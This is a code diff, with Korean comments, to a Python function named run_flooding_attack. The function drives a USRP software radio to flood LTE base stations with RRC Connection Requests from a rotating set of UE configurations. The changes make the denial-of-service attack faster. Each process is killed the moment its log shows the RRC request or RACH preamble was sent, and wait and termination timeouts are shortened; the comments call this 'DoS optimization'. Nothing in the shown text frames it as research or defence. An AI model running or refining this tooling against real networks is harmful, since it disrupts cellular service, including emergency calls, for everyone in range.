@@ -61,11 +61,12 @@ def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None
         return
     
     logger.info(f"{len(config_files)}개의 config 파일로 순차 공격 시작 (하나의 USRP 사용)...")
+    logger.info("공격 모드: RRC Connection Request까지만 전송 후 즉시 종료 (DoS 최적화)")
     
     config_index = 0
     current_process = None
     process_start_time = None
-    max_process_wait_time = 3.0  # 각 프로세스당 최대 3초 대기
+    max_process_wait_time = 2.0  # 각 프로세스당 최대 2초 대기 (RRC Request만 보내고 종료)
     
     try:
         while running_flag is None or running_flag():
@@ -113,30 +114,49 @@ def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None
                     process_start_time = None
                     continue
             
-            # 연결 요청을 보냈는지 확인
+            # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
             if current_process and os.path.exists(log_file):
                 try:
                     with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                         log_content = f.read()
                     
-                    # 연결 요청을 보냈는지 확인
-                    request_sent = any(keyword in log_content.lower() for keyword in [
+                    # RRC Connection Request 전송 확인 (정확히 이것만 체크)
+                    rrc_request_sent = any(keyword in log_content.lower() for keyword in [
                         'rrc connection request',
+                        'sending rrc connection request',
+                        'rrc connection request sent'
+                    ])
+                    
+                    # RACH 전송도 체크 (RRC Request 전 단계)
+                    rach_sent = any(keyword in log_content.lower() for keyword in [
                         'random access',
                         'rach',
-                        'attach request'
+                        'preamble',
+                        'sending rach'
                     ])
                     
                     # PBCH 디코딩 실패 확인
                     pbch_failed = 'could not decode pbch' in log_content.lower()
                     elapsed = time.time() - process_start_time if process_start_time else 0
                     
-                    if request_sent:
-                        # 연결 요청을 보냈으면 즉시 종료하고 다음 config로
+                    # RRC Connection Request를 보냈으면 즉시 종료 (Setup은 무시)
+                    if rrc_request_sent:
+                        # RRC Request 전송 확인 → 즉시 종료하고 다음 UE로
                         if current_process.poll() is None:
                             current_process.terminate()
                             try:
-                                current_process.wait(timeout=0.5)
+                                current_process.wait(timeout=0.3)
+                            except:
+                                current_process.kill()
+                        current_process = None
+                        process_start_time = None
+                        continue
+                    elif rach_sent and elapsed > 0.5:
+                        # RACH 전송 후 0.5초 지났으면 다음으로 (RRC Request가 곧 올 것)
+                        if current_process.poll() is None:
+                            current_process.terminate()
+                            try:
+                                current_process.wait(timeout=0.3)
                             except:
                                 current_process.kill()
                         current_process = None
@@ -147,7 +167,7 @@ def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None
                         if current_process.poll() is None:
                             current_process.terminate()
                             try:
-                                current_process.wait(timeout=0.5)
+                                current_process.wait(timeout=0.3)
                             except:
                                 current_process.kill()
                         current_process = None
